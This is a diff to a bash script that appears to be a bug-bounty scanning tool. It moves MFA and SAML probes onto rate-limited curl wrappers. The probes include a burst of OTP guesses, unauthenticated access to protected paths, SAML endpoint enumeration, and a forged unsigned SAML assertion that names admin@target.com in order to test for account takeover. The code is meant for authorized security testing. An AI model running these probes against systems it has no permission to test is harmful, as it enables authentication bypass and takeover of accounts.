@@ -443,9 +443,16 @@ if ! skip_has mfa; then
             # --- Test 1: Rate limit on OTP endpoint ---
             if unsafe_method_guard "POST" "$BASE" "MFA rate-limit probe"; then
                 log_step "Rate limit probe: $BASE"
+                # Deliberately NOT rate-limited between the 15 burst requests
+                # below (bb_curl_no_wait_no_auth) -- burst rapidity is the
+                # thing this test measures; pacing each guess would prevent
+                # it from ever tripping the target's own rate limiter. One
+                # bb_rate_limit_wait before the burst keeps normal pacing
+                # relative to whatever ran immediately before it.
+                bb_rate_limit_wait
                 STATUS_CODES=$(for i in $(seq 1 15); do
-                    curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
-                        -X POST "$BASE" \
+                    bb_curl_no_wait_no_auth "$BASE" -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
+                        -X POST \
                         -H "Content-Type: application/json" \
                         -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
                 done | sort | uniq -c | sort -rn | head -5)
@@ -460,8 +467,8 @@ if ! skip_has mfa; then
             # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session
             for PROTECTED in dashboard home profile account settings admin; do
                 HOST=$(echo "$url" | grep -oE "https?://[^/]+")
-                SKIP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
-                    "$HOST/$PROTECTED" 2>/dev/null || echo "0")
+                SKIP_CODE=$(bb_curl_no_auth "$HOST/$PROTECTED" -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                    2>/dev/null || echo "0")
                 if [ "$SKIP_CODE" = "200" ]; then
                     log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
                     echo "[POSSIBLE] [MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
@@ -471,7 +478,7 @@ if ! skip_has mfa; then
             # --- Test 3: Response manipulation canary ---
             # Check if server returns JSON with a success/failure flag (indicator only)
             if unsafe_method_guard "POST" "$BASE" "MFA response-manipulation canary"; then
-                RESP=$(curl -sk --max-time 5 -X POST "$BASE" \
+                RESP=$(bb_curl_no_auth "$BASE" -sk --max-time 5 -X POST \
                     -H "Content-Type: application/json" \
                     -d '{"otp":"999999"}' 2>/dev/null || true)
                 if echo "$RESP" | grep -qi '"success"\s*:\s*false\|"verified"\s*:\s*false\|"status"\s*:\s*"fail"'; then
@@ -502,8 +509,8 @@ if ! skip_has saml; then
         for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
                          "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
                          "/.well-known/openid-configuration"; do
-            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
-                "${host}${SAML_PATH}" 2>/dev/null || echo "0")
+            CODE=$(bb_curl_no_auth "${host}${SAML_PATH}" -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                2>/dev/null || echo "0")
             case "$CODE" in
                 200|301|302|403)
                     log_vuln "[SAML] Endpoint found (HTTP $CODE): ${host}${SAML_PATH}"
@@ -516,7 +523,7 @@ if ! skip_has saml; then
     # Metadata exposure check (reveals IdP certs, entity IDs — aids XSW)
     while IFS= read -r url; do
         [ -z "$url" ] && continue
-        RESP=$(curl -sk --max-time 8 "$url" 2>/dev/null || true)
+        RESP=$(bb_curl_no_auth "$url" -sk --max-time 8 2>/dev/null || true)
         if echo "$RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
             log_vuln "[SAML] Metadata exposed (aids XSW/cert extraction): $url"
             echo "[INFORMATIONAL] [SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
@@ -531,8 +538,8 @@ if ! skip_has saml; then
         if unsafe_method_guard "POST" "$ACS_URL" "SAML signature-stripping probe"; then
             # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
             STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
-            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
-                -X POST "$ACS_URL" \
+            CODE=$(bb_curl_no_auth "$ACS_URL" -sk -o /dev/null -w "%{http_code}" --max-time 8 \
+                -X POST \
                 -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
             if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
                 log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
